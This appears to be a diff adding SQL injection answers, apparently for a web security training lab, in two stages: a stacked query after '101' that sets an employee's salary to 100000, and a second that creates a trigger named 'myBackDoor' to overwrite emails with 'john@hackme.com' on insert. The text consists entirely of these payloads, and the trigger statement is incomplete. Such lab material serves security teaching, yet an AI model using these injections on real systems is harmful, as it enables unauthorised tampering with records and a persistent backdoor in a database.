@@ -1,0 +1,8 @@
+Stage1:
+
+101; update employee set salary=100000 where userid=101
+
+Stage 2:
+
+101; create trigger myBackDoor before insert on employee for each row begin
+update set email='john@hackme.com'WHERE userid = NEW.userid
